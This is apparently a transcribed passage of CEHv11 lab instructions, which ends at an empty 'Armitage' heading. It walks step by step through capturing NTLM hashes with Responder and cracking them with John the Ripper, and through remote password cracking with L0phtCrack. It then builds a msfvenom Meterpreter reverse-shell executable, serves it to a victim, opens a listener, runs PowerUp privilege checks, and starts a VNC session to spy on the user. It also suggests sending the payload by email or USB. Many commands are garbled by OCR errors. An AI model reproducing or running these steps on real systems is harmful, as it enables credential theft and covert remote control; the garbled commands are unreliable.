@@ -1,0 +1,116 @@
+Responder
+
+we will use the Responder too! to extract information such as the target system's OS version, clien t version, NTLM client IP address, and NTLM
+username and password hash
+In the Terminal window, type git clone https://github.com/SpiderLabs/Responder and press Enter to install the
+Responder tool.
+The + Other Locations window appears; type smb://10.10.10.10 in the Connect to Server field and click the Connect button
+Navigate to CEHv11 Module 06 System Hacking\GitHub Tools and copy the Responder folder
+Paste the Responder folder in the Home directory .
+In the Terminal window, type cd Responder and press Enter to navigate to the Responder tool folder
+Type chmod +x Responder.py and press Enter to grant permissions to the script
+Now, type sudo ./Responder.py -l ens33 and press Enter. In the password for ubuntu field, type toor and press Enter to run Responder tool
+Note: -l: specifies the interface here, ens33). The interface might differ in your lab environment
+Responder starts listening to the network interface for events, as shown in the screenshot
+In windows The Run window appears; type \\CEH-Tools in the Open field and click OK.
+Responder starts capturing the access logs of the Windows 10 virtual machine. It collects the hashes of the logged-in user of the target machine, as
+shown in the screenshot
+By default, Responder stores the logs in Home/Responder/logs. Navigate to the same location and double-click the SMB-NTLMv2-SSP-1 0.1 0.1 0.1 O.txt file
+A log file appears, displaying the hashes recorded from the target system user, as shown in the screenshot
+To crack the password hash, rl1e John the Ripper too! must be installed on your system. To install rl1e too!, open a new Terminal window, type sudo
+snap install john-the-ripper, and press Enter.
+19. In the password for ubuntu field, type toor and press Enter to install the John the Ripper tool.
+20. After completing the installation of John the Ripper, type sudo john /home/ubuntu/Responderllogs/<Log File Name.txt> and press Enter.
+Note: The log file name will differ in your lab environment Here, the log file name is SMB-NTLMv2-SSP-1 0.1 0.1 0.1 O.txt.
+21. John the Ripper starts cracking the password hashes and displays the password in plain text, as shown in the screenshot
+
+LOphtCrack
+
+you will be runing the LOphtCrack tool by providing the remote machine's administrator with user credentials. User account passwords that are cracked in a short amount of time
+are weak, meaning that you need to take certain measures to strengthen them
+Navigate to E:ICEH-Tools\CEHv11 Module 06 System Hacking\Password Cracking Tools\LOphtCrack; double-click lc7setup_v7.1.5_Win64.exe.
+In the next wizard, click the Password Auditing Wizard button.
+The LC7 Password Auditing Wizard window appears; click Next
+In the Choose Target System Type wizard, ensure that the Windows radio button is selected and click Next
+In the Windows lmport wizard, select the A remote machine radio button and click Next.
+In the Windows lmport From Remote Machine (SMB) wizard, type in the below details:
+• Host: 10.10.10.16 (IP address of the remote machine [Windows Server 2016])
+• Select the Use Specific User Credentials radio button. In the Credentials section, type the login credentials of the Windows Server
+2016 virtual machine (Username: Administrator; Password: Pa$$w0rd) .
+• If the machine is under a domain, enter the domain name in the Domain section. Here, Windows Server 2016 belongs to the CEH.com domain.
+Once you have entered all the required details in the fields, click Next to proceed
+In the Choose Audit Type wizard, select the Thorough Password Audit radio button and click Next
+In the Reporting Options wizard, select the Generate Report at End of Auditing option and ensure that the CSV report type radio button is
+selected. Click the Browse ... button to store the repo rt in the desired location
+The Choose report file na me window appears; select the desired location (here, Desktop) and click Save.
+In the Reporting Options wizard, the selected location to save the file appears tmder the Report File Location field; click Next.
+The .Job Scheduling wizard appears. Ensure that the Run this job immediately radio button is selected and click Next
+Check the given details in the Summary wizard and click Finish
+LOphtCrack starts cracking the passwords of the remo te machine. In the lower-right comer of the window, you can see the status, as shown in the screenshot
+After the status bar completes, LOphtCrack displays the cracked
+passwords of the users that are available on d1e remo te machine, as shown in the screenshot.
+Note: lt will take sorne time to crack all d1e passwords of a remote system.
+22. After successfully attaining weak and strong passwords, as shown in the screenshot, you can click the Stop button in me bottom-right corner of the window.
+
+Exploit Client-Side Vulnerabilities and Establish a VNC Session
+
+Here, we will see how attackers can exploit vulnerabilities in target systems to establish unauthorized VNC sessions using Metasploit and remotely control these targets
+A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.
+Now, type cd and press Enter to jump to the root directory
+
+In the Parrot Terminal window; type msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=<IP Address of Host Machine> LPORT=444 -o
+/root/Desktop/Test.exe and press Enter
+
+Now, create a directory to share this Ele with the target machine, provide the pennissions, and copy the Ele from Desktop to the shared location
+using the below commands:
+Type mkdir /var/www/html/share and press Enter to create a shared folder
+Type chmod -R 755 /var/wwwlhtmllshare and press Enter
+Type chown -R www-data:www-data /var/www/htmllshare and press Enter
+Copy the malicious file to the shared location by typing cp /root/Desktop/Test.exe /varlwww/htmllshare and pressing Enter
+Note: Here, we are sending the malicious payload through a shared directory; but in real-time, you can send it via an attachment in an email or
+through physical means such as a hard drive or pen drive
+Type msfconsole and press Enter to launch the Metasploit framework. 
+12. In msfconsole, type use exploit/multi/handler and press Enter
+Now, set the payload, LHOST, and LPORT. To do so, use the below commands:
+• Type set payload windows/meterpreter/reverse_tcp and press Enter
+Type set LHOST 10.10.10.13 and press Enter
+Type set LPORT 444 and press Enter
+14. After entering the above details, type exploit and press Enter to start the listener.
+In windows
+Open any web browser (here, Mozilla Firefox) . In the address bar, type http:/11 0.1 0.1 0.13/share and press Enter. As soon as you press enter, it
+will display the shared folder contents, as shown in the screenshot.
+18. Click Test.exe to download the file.
+Note: 10.10.10.13 is the IP address of d1e host machine (here, the Parrot Security virtual machine).
+Once you click on the Test.exe file, the Opening Test.exe pop-up appears; select Save File .
+20. The malicious file will download to the browser's default download location (here, Downloads). Now, navigate to this location and doubleclick
+the Test.exe file to run it .
+Observe that one session has been created or opened in the Meterpreter shell, as shown in the screenshot
+Type sysinfo and press Enter to verify that you have hacked the targeted Windows 10.
+Note: If the Meterpreter shell is not automatically connected to the session, type sessions -i 1 and press Enter to open a session in Meterpreter shell.
+Now, open another Parrot Terminal and navigate to the root directory.
+26. In the Terminal window, type git clone https://github.com/PowerShellMafia/PowerSploit and press Enter. The
+PowerSploit repository is downloaded to the root directory.
+Note: Yo u can also access the too! repository from the CEH-Tools folder available in Windows 10 virtual machine, in case, the GitHub link does not exist, or you
+are unable to clone the too! repository. Follow the steps below in order to access CEH-Tools folder from the Parrot Security virtual machine:
+Open any explorer window and press Ctrl+L The Location field appears; type smb://10.10.10.10 and press Enter to access Windows 10 shared folders.
+T11e security pop-up appears; enter the Windows 10 virtual machine credentials (Usemame: Admin and Password: Pa$$w0rd) and click Connect.
+The Windows shares on 10.10.10.10 window appears; navigate to the location CEH-Tools/CEHv11 Module 06 System Hacking/GitHub Tools/ and copy the PowerSploit folder.
+Paste the copied PowerSploit folder on the location /home/attacker/
+In the terminal window, type mv /home/attacker/PowerSploit/root/.
+27. Now, switch back to the Terminal window with an active Meterpreter session. Type upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1
+and press Enter. This command uploads the PowerSploit file (PowerUp.ps1) to the target system's present working directory.
+Type shell and press Enter to open a shell session. Observe that the present working directory points to the Downloads folder in the target system
+Type powersheii-ExecutionPolic:y Bypass -Command "·.\Powertlp.ps1 ;Invoke-AllChecks" and press Enter to run the PowerUp.ps1 file.
+Note: PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. lt
+utilizes various service abuse checks, .dll hijacking opportunities, registry checks, etc. to enumera te common elevation methods for a target system.
+30. A result appears, displaying vulnerabilities in unquoted service paths, service executables, argument permissions, DLL locations, service
+permissions, unattended install ftles, and older locations.
+Note: Attackers exploit misconfigured services such as unquoted service paths, service object permissions, tmattended installs, modifiable registry
+autoruns and configurations, and oilier locations to elevate access privileges.
+After establishing an active session using Metasploit, attackers use tools such as PowerSploit to detect misconfigured services iliat exist in ilie target OS.
+31. Now, type exit and press Enter to revert to ilie Meterpreter session.
+32. Now, exploit VNC vulnerability to gain remote access to the Windows 10 virtual machine. Todo so, type run vnc and press Enter.
+This will open a VNC session for d1e target machine, as shown in the screenshot. Using this session, you can see the victim's activities on the system, including the files, 
+websites, software, and other resources the user opens or runs.
+
+Armitage
